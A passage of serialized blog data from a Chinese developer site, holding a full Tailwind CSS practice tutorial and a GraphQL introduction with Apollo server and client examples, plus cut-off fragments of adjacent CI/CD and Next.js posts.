SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK }}\\n```\\n\\n---\\n\\nCI/CD \u662f\u56e2\u961f\u6548\u7387\u7684\u500d\u589e\u5668\u3002\u4ece\u7b80\u5355\u7684\u6d41\u6c34\u7ebf\u5f00\u59cb\uff0c\u9010\u6b65\u5b8c\u5584\u3002"},{"id":"tailwindcss-practice","metadata":{"permalink":"/blog/tailwindcss-practice","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-11-15-tailwindcss.md","source":"@site/blog/2024-11-15-tailwindcss.md","title":"Tailwind CSS \u5b9e\u8df5\u6280\u5de7","description":"Tailwind CSS \u662f\u4e00\u4e2a\u539f\u5b50\u5316\u7684 CSS \u6846\u67b6\uff0c\u8ba9\u4f60\u65e0\u9700\u79bb\u5f00 HTML \u5c31\u80fd\u6784\u5efa\u73b0\u4ee3\u754c\u9762\u3002\u672c\u6587\u5206\u4eab Tailwind \u7684\u5b9e\u7528\u6280\u5de7\u3002","date":"2024-11-15T00:00:00.000Z","tags":[{"inline":true,"label":"CSS","permalink":"/blog/tags/css"},{"inline":true,"label":"Tailwind","permalink":"/blog/tags/tailwind"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"}],"readingTime":5.25,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"tailwindcss-practice","title":"Tailwind CSS \u5b9e\u8df5\u6280\u5de7","authors":"mason","tags":["CSS","Tailwind","\u524d\u7aef"]},"unlisted":false,"prevItem":{"title":"CI/CD \u6d41\u6c34\u7ebf\u642d\u5efa\u6307\u5357","permalink":"/blog/cicd-pipeline"},"nextItem":{"title":"GraphQL \u5165\u95e8\u6307\u5357","permalink":"/blog/graphql-intro"}},"content":"Tailwind CSS \u662f\u4e00\u4e2a\u539f\u5b50\u5316\u7684 CSS \u6846\u67b6\uff0c\u8ba9\u4f60\u65e0\u9700\u79bb\u5f00 HTML \u5c31\u80fd\u6784\u5efa\u73b0\u4ee3\u754c\u9762\u3002\u672c\u6587\u5206\u4eab Tailwind \u7684\u5b9e\u7528\u6280\u5de7\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4e3a\u4ec0\u4e48\u9009\u62e9 Tailwind\\n\\n| \u4f18\u52bf | \u8bf4\u660e |\\n|------|------|\\n| \u5f00\u53d1\u6548\u7387\u9ad8 | \u65e0\u9700\u5207\u6362\u6587\u4ef6\uff0c\u5feb\u901f\u7f16\u5199\u6837\u5f0f |\\n| \u5305\u4f53\u79ef\u5c0f | \u53ea\u6253\u5305\u4f7f\u7528\u7684\u6837\u5f0f |\\n| \u4e00\u81f4\u6027\u597d | \u9884\u8bbe\u7684\u8bbe\u8ba1\u7cfb\u7edf |\\n| \u53ef\u5b9a\u5236 | \u5b8c\u5168\u53ef\u914d\u7f6e |\\n| \u54cd\u5e94\u5f0f\u53cb\u597d | \u5185\u7f6e\u65ad\u70b9\u524d\u7f00 |\\n\\n---\\n\\n## \ud83d\ude80 \u5feb\u901f\u5f00\u59cb\\n\\n### \u5b89\u88c5\\n\\n```bash\\nnpm install -D tailwindcss postcss autoprefixer\\nnpx tailwindcss init -p\\n```\\n\\n### \u914d\u7f6e\\n\\n```javascript\\n// tailwind.config.js\\n/** @type {import(\'tailwindcss\').Config} */\\nmodule.exports = {\\n  content: [\\n    \'./src/**/*.{js,ts,jsx,tsx,mdx}\',\\n  ],\\n  theme: {\\n    extend: {},\\n  },\\n  plugins: [],\\n};\\n```\\n\\n### \u5f15\u5165\u6837\u5f0f\\n\\n```css\\n/* globals.css */\\n@tailwind base;\\n@tailwind components;\\n@tailwind utilities;\\n```\\n\\n---\\n\\n## \ud83d\udcdd \u57fa\u7840\u7528\u6cd5\\n\\n### \u95f4\u8ddd\\n\\n```html\\n\x3c!-- \u5185\u8fb9\u8ddd --\x3e\\n<div class=\\"p-4\\">padding: 1rem</div>\\n<div class=\\"px-4 py-2\\">x: 1rem, y: 0.5rem</div>\\n<div class=\\"pt-4 pr-2 pb-4 pl-2\\">\u5404\u65b9\u5411</div>\\n\\n\x3c!-- \u5916\u8fb9\u8ddd --\x3e\\n<div class=\\"m-4\\">margin: 1rem</div>\\n<div class=\\"mx-auto\\">\u6c34\u5e73\u5c45\u4e2d</div>\\n<div class=\\"mt-4 mb-8\\">\u4e0a\u4e0b</div>\\n\\n\x3c!-- \u95f4\u8ddd\u5355\u4f4d\uff1a4 = 1rem = 16px --\x3e\\n\x3c!-- 1=0.25rem, 2=0.5rem, 4=1rem, 8=2rem --\x3e\\n```\\n\\n### \u5c3a\u5bf8\\n\\n```html\\n\x3c!-- \u5bbd\u5ea6 --\x3e\\n<div class=\\"w-full\\">100%</div>\\n<div class=\\"w-1/2\\">50%</div>\\n<div class=\\"w-64\\">16rem</div>\\n<div class=\\"w-screen\\">100vw</div>\\n<div class=\\"max-w-md\\">max-width</div>\\n\\n\x3c!-- \u9ad8\u5ea6 --\x3e\\n<div class=\\"h-screen\\">100vh</div>\\n<div class=\\"h-full\\">100%</div>\\n<div class=\\"min-h-screen\\">\u6700\u5c0f 100vh</div>\\n```\\n\\n### \u989c\u8272\\n\\n```html\\n\x3c!-- \u6587\u5b57\u989c\u8272 --\x3e\\n<p class=\\"text-gray-900\\">\u6df1\u8272\u6587\u5b57</p>\\n<p class=\\"text-blue-500\\">\u84dd\u8272\u6587\u5b57</p>\\n<p class=\\"text-red-600\\">\u7ea2\u8272\u6587\u5b57</p>\\n\\n\x3c!-- \u80cc\u666f\u8272 --\x3e\\n<div class=\\"bg-white\\">\u767d\u8272\u80cc\u666f</div>\\n<div class=\\"bg-gray-100\\">\u7070\u8272\u80cc\u666f</div>\\n<div class=\\"bg-blue-500\\">\u84dd\u8272\u80cc\u666f</div>\\n\\n\x3c!-- \u900f\u660e\u5ea6 --\x3e\\n<div class=\\"bg-black/50\\">50% \u900f\u660e\u9ed1</div>\\n<div class=\\"text-white/80\\">80% \u900f\u660e\u767d</div>\\n```\\n\\n### \u6392\u7248\\n\\n```html\\n\x3c!-- \u5b57\u4f53\u5927\u5c0f --\x3e\\n<p class=\\"text-sm\\">\u5c0f\u5b57</p>\\n<p class=\\"text-base\\">\u6b63\u5e38</p>\\n<p class=\\"text-lg\\">\u5927\u5b57</p>\\n<p class=\\"text-2xl\\">\u66f4\u5927</p>\\n\\n\x3c!-- \u5b57\u91cd --\x3e\\n<p class=\\"font-normal\\">\u6b63\u5e38</p>\\n<p class=\\"font-medium\\">\u4e2d\u7b49</p>\\n<p class=\\"font-bold\\">\u7c97\u4f53</p>\\n\\n\x3c!-- \u5bf9\u9f50 --\x3e\\n<p class=\\"text-left\\">\u5de6\u5bf9\u9f50</p>\\n<p class=\\"text-center\\">\u5c45\u4e2d</p>\\n<p class=\\"text-right\\">\u53f3\u5bf9\u9f50</p>\\n```\\n\\n---\\n\\n## \ud83d\udcd0 Flexbox \u548c Grid\\n\\n### Flexbox\\n\\n```html\\n\x3c!-- \u57fa\u7840 Flex --\x3e\\n<div class=\\"flex items-center justify-between\\">\\n  <span>Left</span>\\n  <span>Right</span>\\n</div>\\n\\n\x3c!-- \u5782\u76f4\u5c45\u4e2d --\x3e\\n<div class=\\"flex items-center justify-center h-screen\\">\\n  <p>\u5c45\u4e2d\u5185\u5bb9</p>\\n</div>\\n\\n\x3c!-- \u95f4\u8ddd --\x3e\\n<div class=\\"flex gap-4\\">\\n  <div>Item 1</div>\\n  <div>Item 2</div>\\n  <div>Item 3</div>\\n</div>\\n\\n\x3c!-- \u6362\u884c --\x3e\\n<div class=\\"flex flex-wrap gap-4\\">\\n  \x3c!-- items --\x3e\\n</div>\\n```\\n\\n### Grid\\n\\n```html\\n\x3c!-- \u57fa\u7840 Grid --\x3e\\n<div class=\\"grid grid-cols-3 gap-4\\">\\n  <div>1</div>\\n  <div>2</div>\\n  <div>3</div>\\n</div>\\n\\n\x3c!-- \u54cd\u5e94\u5f0f\u5217\u6570 --\x3e\\n<div class=\\"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4\\">\\n  \x3c!-- items --\x3e\\n</div>\\n\\n\x3c!-- \u8de8\u5217 --\x3e\\n<div class=\\"grid grid-cols-4 gap-4\\">\\n  <div class=\\"col-span-2\\">\u8de8 2 \u5217</div>\\n  <div>1 \u5217</div>\\n  <div>1 \u5217</div>\\n</div>\\n```\\n\\n---\\n\\n## \ud83d\udcf1 \u54cd\u5e94\u5f0f\u8bbe\u8ba1\\n\\n### \u65ad\u70b9\\n\\n| \u524d\u7f00 | \u6700\u5c0f\u5bbd\u5ea6 | CSS |\\n|------|---------|-----|\\n| `sm` | 640px | `@media (min-width: 640px)` |\\n| `md` | 768px | `@media (min-width: 768px)` |\\n| `lg` | 1024px | `@media (min-width: 1024px)` |\\n| `xl` | 1280px | `@media (min-width: 1280px)` |\\n| `2xl` | 1536px | `@media (min-width: 1536px)` |\\n\\n### \u4f7f\u7528\u793a\u4f8b\\n\\n```html\\n\x3c!-- \u79fb\u52a8\u7aef\u4f18\u5148 --\x3e\\n<div class=\\"\\n  w-full        /* \u9ed8\u8ba4\u5168\u5bbd */\\n  md:w-1/2      /* \u4e2d\u5c4f\u4e00\u534a */\\n  lg:w-1/3      /* \u5927\u5c4f\u4e09\u5206\u4e4b\u4e00 */\\n\\">\\n  \u54cd\u5e94\u5f0f\u5bbd\u5ea6\\n</div>\\n\\n\x3c!-- \u54cd\u5e94\u5f0f\u9690\u85cf --\x3e\\n<div class=\\"hidden md:block\\">\u4ec5\u684c\u9762\u663e\u793a</div>\\n<div class=\\"md:hidden\\">\u4ec5\u79fb\u52a8\u7aef\u663e\u793a</div>\\n\\n\x3c!-- \u54cd\u5e94\u5f0f\u5e03\u5c40 --\x3e\\n<div class=\\"flex flex-col md:flex-row gap-4\\">\\n  <aside class=\\"w-full md:w-64\\">\u4fa7\u8fb9\u680f</aside>\\n  <main class=\\"flex-1\\">\u4e3b\u5185\u5bb9</main>\\n</div>\\n```\\n\\n---\\n\\n## \ud83c\udfa8 \u72b6\u6001\u53d8\u4f53\\n\\n### \u60ac\u505c\u548c\u7126\u70b9\\n\\n```html\\n<button class=\\"\\n  bg-blue-500 \\n  hover:bg-blue-600 \\n  focus:ring-2 \\n  focus:ring-blue-300\\n  active:bg-blue-700\\n\\">\\n  \u6309\u94ae\\n</button>\\n\\n<input class=\\"\\n  border \\n  border-gray-300 \\n  focus:border-blue-500 \\n  focus:ring-1 \\n  focus:ring-blue-500\\n  focus:outline-none\\n\\" />\\n```\\n\\n### \u5206\u7ec4\u72b6\u6001\\n\\n```html\\n<div class=\\"group\\">\\n  <img class=\\"group-hover:scale-105 transition\\" />\\n  <p class=\\"group-hover:text-blue-500\\">\u6807\u9898</p>\\n</div>\\n```\\n\\n### \u6697\u8272\u6a21\u5f0f\\n\\n```html\\n<div class=\\"bg-white dark:bg-gray-900\\">\\n  <p class=\\"text-gray-900 dark:text-white\\">\\n    \u81ea\u52a8\u9002\u5e94\u4e3b\u9898\\n  </p>\\n</div>\\n```\\n\\n---\\n\\n## \ud83e\udde9 \u7ec4\u4ef6\u62bd\u8c61\\n\\n### @apply \u63d0\u53d6\\n\\n```css\\n/* globals.css */\\n@layer components {\\n  .btn {\\n    @apply px-4 py-2 rounded font-medium transition;\\n  }\\n  \\n  .btn-primary {\\n    @apply btn bg-blue-500 text-white hover:bg-blue-600;\\n  }\\n  \\n  .btn-secondary {\\n    @apply btn bg-gray-200 text-gray-800 hover:bg-gray-300;\\n  }\\n  \\n  .card {\\n    @apply bg-white rounded-lg shadow-md p-6;\\n  }\\n}\\n```\\n\\n### React \u7ec4\u4ef6\\n\\n```tsx\\ninterface ButtonProps {\\n  variant?: \'primary\' | \'secondary\';\\n  children: React.ReactNode;\\n}\\n\\nfunction Button({ variant = \'primary\', children }: ButtonProps) {\\n  const baseStyles = \'px-4 py-2 rounded font-medium transition\';\\n  const variants = {\\n    primary: \'bg-blue-500 text-white hover:bg-blue-600\',\\n    secondary: \'bg-gray-200 text-gray-800 hover:bg-gray-300\',\\n  };\\n\\n  return (\\n    <button className={`${baseStyles} ${variants[variant]}`}>\\n      {children}\\n    </button>\\n  );\\n}\\n```\\n\\n### clsx / cn \u5de5\u5177\\n\\n```tsx\\nimport { clsx } from \'clsx\';\\nimport { twMerge } from \'tailwind-merge\';\\n\\nfunction cn(...inputs) {\\n  return twMerge(clsx(inputs));\\n}\\n\\n// \u4f7f\u7528\\n<button className={cn(\\n  \'px-4 py-2 rounded\',\\n  isActive && \'bg-blue-500\',\\n  disabled && \'opacity-50 cursor-not-allowed\',\\n  className\\n)}>\\n  \u6309\u94ae\\n</button>\\n```\\n\\n---\\n\\n## \u2699\ufe0f \u81ea\u5b9a\u4e49\u914d\u7f6e\\n\\n```javascript\\n// tailwind.config.js\\nmodule.exports = {\\n  theme: {\\n    extend: {\\n      colors: {\\n        brand: {\\n          50: \'#f0f9ff\',\\n          500: \'#3b82f6\',\\n          900: \'#1e3a8a\',\\n        },\\n      },\\n      fontFamily: {\\n        sans: [\'Inter\', \'sans-serif\'],\\n      },\\n      spacing: {\\n        \'128\': \'32rem\',\\n      },\\n      animation: {\\n        \'fade-in\': \'fadeIn 0.5s ease-out\',\\n      },\\n      keyframes: {\\n        fadeIn: {\\n          \'0%\': { opacity: \'0\' },\\n          \'100%\': { opacity: \'1\' },\\n        },\\n      },\\n    },\\n  },\\n  plugins: [\\n    require(\'@tailwindcss/forms\'),\\n    require(\'@tailwindcss/typography\'),\\n  ],\\n};\\n```\\n\\n---\\n\\n## \ud83d\udca1 \u5b9e\u7528\u6280\u5de7\\n\\n### 1. \u622a\u65ad\u6587\u672c\\n\\n```html\\n<p class=\\"truncate\\">\u5f88\u957f\u7684\u6587\u672c...</p>\\n<p class=\\"line-clamp-2\\">\u9650\u5236\u4e24\u884c...</p>\\n```\\n\\n### 2. \u7eb5\u6a2a\u6bd4\\n\\n```html\\n<div class=\\"aspect-video\\">16:9</div>\\n<div class=\\"aspect-square\\">1:1</div>\\n```\\n\\n### 3. \u6eda\u52a8\u5bb9\u5668\\n\\n```html\\n<div class=\\"h-64 overflow-y-auto scrollbar-thin\\">\\n  \x3c!-- \u5185\u5bb9 --\x3e\\n</div>\\n```\\n\\n### 4. \u6e10\u53d8\\n\\n```html\\n<div class=\\"bg-gradient-to-r from-blue-500 to-purple-500\\">\\n  \u6e10\u53d8\u80cc\u666f\\n</div>\\n```\\n\\n---\\n\\n## \ud83d\udccb \u63a8\u8350\u63d2\u4ef6\\n\\n| \u63d2\u4ef6 | \u7528\u9014 |\\n|------|------|\\n| `@tailwindcss/forms` | \u8868\u5355\u6837\u5f0f |\\n| `@tailwindcss/typography` | \u6587\u7ae0\u6392\u7248 |\\n| `@tailwindcss/aspect-ratio` | \u7eb5\u6a2a\u6bd4 |\\n| `tailwind-merge` | \u7c7b\u540d\u5408\u5e76 |\\n| `clsx` | \u6761\u4ef6\u7c7b\u540d |\\n\\n---\\n\\nTailwind \u7684\u6838\u5fc3\u7406\u5ff5\u662f\\"\u7ea6\u675f\u5373\u81ea\u7531\\"\u3002\u719f\u7ec3\u638c\u63e1\u540e\uff0c\u5f00\u53d1\u6548\u7387\u4f1a\u5927\u5e45\u63d0\u5347\u3002"},{"id":"graphql-intro","metadata":{"permalink":"/blog/graphql-intro","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-11-01-graphql.md","source":"@site/blog/2024-11-01-graphql.md","title":"GraphQL \u5165\u95e8\u6307\u5357","description":"GraphQL \u662f\u4e00\u79cd API \u67e5\u8be2\u8bed\u8a00\uff0c\u8ba9\u5ba2\u6237\u7aef\u7cbe\u786e\u83b7\u53d6\u6240\u9700\u6570\u636e\u3002\u672c\u6587\u4ecb\u7ecd GraphQL \u7684\u6838\u5fc3\u6982\u5ff5\u548c\u4f7f\u7528\u65b9\u6cd5\u3002","date":"2024-11-01T00:00:00.000Z","tags":[{"inline":true,"label":"GraphQL","permalink":"/blog/tags/graph-ql"},{"inline":true,"label":"API","permalink":"/blog/tags/api"},{"inline":true,"label":"\u540e\u7aef","permalink":"/blog/tags/\u540e\u7aef"}],"readingTime":3.82,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"graphql-intro","title":"GraphQL \u5165\u95e8\u6307\u5357","authors":"mason","tags":["GraphQL","API","\u540e\u7aef"]},"unlisted":false,"prevItem":{"title":"Tailwind CSS \u5b9e\u8df5\u6280\u5de7","permalink":"/blog/tailwindcss-practice"},"nextItem":{"title":"Next.js App Router \u5b9e\u6218\u6307\u5357","permalink":"/blog/nextjs-app-router"}},"content":"GraphQL \u662f\u4e00\u79cd API \u67e5\u8be2\u8bed\u8a00\uff0c\u8ba9\u5ba2\u6237\u7aef\u7cbe\u786e\u83b7\u53d6\u6240\u9700\u6570\u636e\u3002\u672c\u6587\u4ecb\u7ecd GraphQL \u7684\u6838\u5fc3\u6982\u5ff5\u548c\u4f7f\u7528\u65b9\u6cd5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf GraphQL vs REST\\n\\n| \u7279\u6027 | REST | GraphQL |\\n|------|------|---------|\\n| \u7aef\u70b9 | \u591a\u4e2a `/users`, `/posts` | \u5355\u4e2a `/graphql` |\\n| \u6570\u636e\u83b7\u53d6 | \u56fa\u5b9a\u7ed3\u6784 | \u6309\u9700\u67e5\u8be2 |\\n| \u8fc7\u5ea6\u83b7\u53d6 | \u5e38\u89c1 | \u907f\u514d |\\n| \u591a\u6b21\u8bf7\u6c42 | \u9700\u8981\u591a\u4e2a\u8bf7\u6c42 | \u4e00\u6b21\u8bf7\u6c42 |\\n| \u7248\u672c\u63a7\u5236 | `/v1`, `/v2` | \u65e0\u9700\u7248\u672c |\\n| \u7c7b\u578b\u7cfb\u7edf | \u65e0 | \u5f3a\u7c7b\u578b |\\n\\n---\\n\\n## \ud83d\udcdd \u57fa\u7840\u8bed\u6cd5\\n\\n### \u67e5\u8be2 (Query)\\n\\n```graphql\\n# \u57fa\u7840\u67e5\u8be2\\nquery {\\n  user(id: \\"1\\") {\\n    id\\n    name\\n    email\\n  }\\n}\\n\\n# \u54cd\u5e94\\n{\\n  \\"data\\": {\\n    \\"user\\": {\\n      \\"id\\": \\"1\\",\\n      \\"name\\": \\"John\\",\\n      \\"email\\": \\"john@example.com\\"\\n    }\\n  }\\n}\\n```\\n\\n### \u5d4c\u5957\u67e5\u8be2\\n\\n```graphql\\nquery {\\n  user(id: \\"1\\") {\\n    name\\n    posts {\\n      title\\n      comments {\\n        content\\n        author {\\n          name\\n        }\\n      }\\n    }\\n  }\\n}\\n```\\n\\n### \u53d8\u91cf\\n\\n```graphql\\nquery GetUser($id: ID!) {\\n  user(id: $id) {\\n    name\\n    email\\n  }\\n}\\n\\n# \u53d8\u91cf\\n{\\n  \\"id\\": \\"1\\"\\n}\\n```\\n\\n### \u522b\u540d\\n\\n```graphql\\nquery {\\n  admin: user(id: \\"1\\") {\\n    name\\n  }\\n  guest: user(id: \\"2\\") {\\n    name\\n  }\\n}\\n```\\n\\n### \u7247\u6bb5 (Fragment)\\n\\n```graphql\\nfragment UserFields on User {\\n  id\\n  name\\n  email\\n  avatar\\n}\\n\\nquery {\\n  user(id: \\"1\\") {\\n    ...UserFields\\n    posts {\\n      title\\n    }\\n  }\\n  \\n  users {\\n    ...UserFields\\n  }\\n}\\n```\\n\\n---\\n\\n## \u270f\ufe0f \u53d8\u66f4 (Mutation)\\n\\n```graphql\\nmutation CreateUser($input: CreateUserInput!) {\\n  createUser(input: $input) {\\n    id\\n    name\\n    email\\n  }\\n}\\n\\n# \u53d8\u91cf\\n{\\n  \\"input\\": {\\n    \\"name\\": \\"John\\",\\n    \\"email\\": \\"john@example.com\\"\\n  }\\n}\\n```\\n\\n```graphql\\nmutation UpdateUser($id: ID!, $input: UpdateUserInput!) {\\n  updateUser(id: $id, input: $input) {\\n    id\\n    name\\n  }\\n}\\n\\nmutation DeleteUser($id: ID!) {\\n  deleteUser(id: $id) {\\n    success\\n    message\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udce1 \u8ba2\u9605 (Subscription)\\n\\n```graphql\\nsubscription OnMessageCreated($channelId: ID!) {\\n  messageCreated(channelId: $channelId) {\\n    id\\n    content\\n    author {\\n      name\\n    }\\n    createdAt\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83c\udfd7\ufe0f Schema \u5b9a\u4e49\\n\\n### \u7c7b\u578b\u5b9a\u4e49\\n\\n```graphql\\n# \u5bf9\u8c61\u7c7b\u578b\\ntype User {\\n  id: ID!\\n  name: String!\\n  email: String!\\n  age: Int\\n  isActive: Boolean!\\n  posts: [Post!]!\\n  createdAt: DateTime!\\n}\\n\\ntype Post {\\n  id: ID!\\n  title: String!\\n  content: String!\\n  author: User!\\n  tags: [String!]\\n  published: Boolean!\\n}\\n\\n# \u8f93\u5165\u7c7b\u578b\\ninput CreateUserInput {\\n  name: String!\\n  email: String!\\n  age: Int\\n}\\n\\ninput UpdateUserInput {\\n  name: String\\n  email: String\\n  age: Int\\n}\\n\\n# \u679a\u4e3e\\nenum Role {\\n  ADMIN\\n  USER\\n  GUEST\\n}\\n\\n# \u63a5\u53e3\\ninterface Node {\\n  id: ID!\\n}\\n\\ntype User implements Node {\\n  id: ID!\\n  name: String!\\n}\\n```\\n\\n### \u6839\u7c7b\u578b\\n\\n```graphql\\ntype Query {\\n  user(id: ID!): User\\n  users(limit: Int, offset: Int): [User!]!\\n  post(id: ID!): Post\\n  posts(authorId: ID): [Post!]!\\n}\\n\\ntype Mutation {\\n  createUser(input: CreateUserInput!): User!\\n  updateUser(id: ID!, input: UpdateUserInput!): User\\n  deleteUser(id: ID!): Boolean!\\n  createPost(input: CreatePostInput!): Post!\\n}\\n\\ntype Subscription {\\n  userCreated: User!\\n  postPublished: Post!\\n}\\n```\\n\\n---\\n\\n## \ud83d\udda5\ufe0f \u670d\u52a1\u7aef\u5b9e\u73b0 (Node.js)\\n\\n### Apollo Server\\n\\n```javascript\\nimport { ApolloServer } from \'@apollo/server\';\\nimport { startStandaloneServer } from \'@apollo/server/standalone\';\\n\\n// \u7c7b\u578b\u5b9a\u4e49\\nconst typeDefs = `\\n  type User {\\n    id: ID!\\n    name: String!\\n    email: String!\\n  }\\n\\n  type Query {\\n    users: [User!]!\\n    user(id: ID!): User\\n  }\\n\\n  type Mutation {\\n    createUser(name: String!, email: String!): User!\\n  }\\n`;\\n\\n// \u89e3\u6790\u5668\\nconst resolvers = {\\n  Query: {\\n    users: () => db.users.findMany(),\\n    user: (_, { id }) => db.users.findById(id),\\n  },\\n  Mutation: {\\n    createUser: (_, { name, email }) => {\\n      return db.users.create({ name, email });\\n    },\\n  },\\n};\\n\\n// \u521b\u5efa\u670d\u52a1\u5668\\nconst server = new ApolloServer({\\n  typeDefs,\\n  resolvers,\\n});\\n\\nconst { url } = await startStandaloneServer(server, {\\n  listen: { port: 4000 },\\n});\\n\\nconsole.log(`Server ready at ${url}`);\\n```\\n\\n### \u89e3\u6790\u5668\u4e0a\u4e0b\u6587\\n\\n```javascript\\nconst resolvers = {\\n  Query: {\\n    me: (parent, args, context) => {\\n      // context \u5305\u542b\u8bf7\u6c42\u4fe1\u606f\u3001\u8ba4\u8bc1\u7b49\\n      if (!context.user) {\\n        throw new Error(\'Not authenticated\');\\n      }\\n      return context.user;\\n    },\\n  },\\n  User: {\\n    // \u5b57\u6bb5\u89e3\u6790\u5668\\n    posts: (parent, args, context) => {\\n      return db.posts.findByAuthorId(parent.id);\\n    },\\n  },\\n};\\n\\n// \u8bbe\u7f6e context\\nconst { url } = await startStandaloneServer(server, {\\n  context: async ({ req }) => ({\\n    user: await getUserFromToken(req.headers.authorization),\\n  }),\\n});\\n```\\n\\n---\\n\\n## \ud83d\udcf1 \u5ba2\u6237\u7aef\u4f7f\u7528\\n\\n### Apollo Client (React)\\n\\n```javascript\\nimport { ApolloClient, InMemoryCache, ApolloProvider, gql, useQuery, useMutation } from \'@apollo/client\';\\n\\n// \u521b\u5efa\u5ba2\u6237\u7aef\\nconst client = new ApolloClient({\\n  uri: \'http://localhost:4000/graphql\',\\n  cache: new InMemoryCache(),\\n});\\n\\n// Provider\\nfunction App() {\\n  return (\\n    <ApolloProvider client={client}>\\n      <UserList />\\n    </ApolloProvider>\\n  );\\n}\\n```\\n\\n### useQuery\\n\\n```javascript\\nconst GET_USERS = gql`\\n  query GetUsers {\\n    users {\\n      id\\n      name\\n      email\\n    }\\n  }\\n`;\\n\\nfunction UserList() {\\n  const { loading, error, data, refetch } = useQuery(GET_USERS);\\n\\n  if (loading) return <p>Loading...</p>;\\n  if (error) return <p>Error: {error.message}</p>;\\n\\n  return (\\n    <ul>\\n      {data.users.map(user => (\\n        <li key={user.id}>{user.name}</li>\\n      ))}\\n    </ul>\\n  );\\n}\\n```\\n\\n### useMutation\\n\\n```javascript\\nconst CREATE_USER = gql`\\n  mutation CreateUser($name: String!, $email: String!) {\\n    createUser(name: $name, email: $email) {\\n      id\\n      name\\n      email\\n    }\\n  }\\n`;\\n\\nfunction CreateUserForm() {\\n  const [createUser, { loading, error }] = useMutation(CREATE_USER, {\\n    refetchQueries: [\'GetUsers\'], // \u5237\u65b0\u5217\u8868\\n  });\\n\\n  const handleSubmit = async (e) => {\\n    e.preventDefault();\\n    const formData = new FormData(e.target);\\n    \\n    await createUser({\\n      variables: {\\n        name: formData.get(\'name\'),\\n        email: formData.get(\'email\'),\\n      },\\n    });\\n  };\\n\\n  return (\\n    <form onSubmit={handleSubmit}>\\n      <input name=\\"name\\" placeholder=\\"Name\\" />\\n      <input name=\\"email\\" placeholder=\\"Email\\" />\\n      <button type=\\"submit\\" disabled={loading}>\\n        {loading ? \'Creating...\' : \'Create\'}\\n      </button>\\n      {error && <p>Error: {error.message}</p>}\\n    </form>\\n  );\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u6700\u4f73\u5b9e\u8df5\\n\\n### \u5206\u9875\\n\\n```graphql\\ntype Query {\\n  posts(first: Int, after: String): PostConnection!\\n}\\n\\ntype PostConnection {\\n  edges: [PostEdge!]!\\n  pageInfo: PageInfo!\\n}\\n\\ntype PostEdge {\\n  node: Post!\\n  cursor: String!\\n}\\n\\ntype PageInfo {\\n  hasNextPage: Boolean!\\n  endCursor: String\\n}\\n```\\n\\n### \u9519\u8bef\u5904\u7406\\n\\n```graphql\\ntype MutationResult {\\n  success: Boolean!\\n  message: String\\n  errors: [Error!]\\n}\\n\\ntype Error {\\n  field: String\\n  message: String!\\n}\\n```\\n\\n### N+1 \u95ee\u9898\\n\\n```javascript\\n// \u4f7f\u7528 DataLoader \u89e3\u51b3\\nimport DataLoader from \'dataloader\';\\n\\nconst userLoader = new DataLoader(async (ids) => {\\n  const users = await db.users.findMany({\\n    where: { id: { in: ids } },\\n  });\\n  return ids.map(id => users.find(u => u.id === id));\\n});\\n\\nconst resolvers = {\\n  Post: {\\n    author: (post) => userLoader.load(post.authorId),\\n  },\\n};\\n```\\n\\n---\\n\\n## \ud83d\udccb \u5bf9\u6bd4\u603b\u7ed3\\n\\n| \u573a\u666f | \u63a8\u8350 |\\n|------|------|\\n| \u7b80\u5355 CRUD | REST |\\n| \u590d\u6742\u6570\u636e\u5173\u7cfb | GraphQL |\\n| \u79fb\u52a8\u7aef/\u5e26\u5bbd\u654f\u611f | GraphQL |\\n| \u516c\u5f00 API | REST |\\n| \u5185\u90e8 API | GraphQL |\\n| \u5fae\u670d\u52a1\u805a\u5408 | GraphQL |\\n\\n---\\n\\nGraphQL \u4e0d\u662f REST \u7684\u66ff\u4ee3\u54c1\uff0c\u800c\u662f\u53e6\u4e00\u79cd\u9009\u62e9\u3002\u6839\u636e\u9879\u76ee\u9700\u6c42\u9009\u62e9\u5408\u9002\u7684\u65b9\u6848\u3002"},{"id":"nextjs-app-router","metadata":{"permalink":"/blog/nextjs-app-router","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-10-20-nextjs-app-router.md","source":"@site/blog/2024-10-20-nextjs-app-router.md","title":"Next.js App Router \u5b9e\u6218\u6307\u5357","description":"Next.js 13 \u5f15\u5165\u7684 App Router \u5e26\u6765\u4e86\u5168\u65b0\u7684\u5f00\u53d1\u4f53\u9a8c\u3002\u672c\u6587\u8be6\u89e3 App Router \u7684\u6838\u5fc3\u6982\u5ff5\u548c\u6700\u4f73\u5b9e\u8df5\u3002","date":"2024-10-20T00:00:00.000Z","tags":[{"inline":true,"label":"Next.js","permalink":"/blog/tags/next-js"},{"inline":true,"label":"React","permalink":"/blog/tags/react"},{"inline":true,"label":"\u6846\u67b6","permalink":"/blog/tags/\u6846\u67b6"}],"readingTime":4.04,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"nextjs-app-router","title":"Next.js App Router \u5b9e\u6218\u6307\u5357","authors":"mason","tags":["Next.js","React","\u6846\u67b6"]},"unlisted":false,"prevItem":{"title":"GraphQL 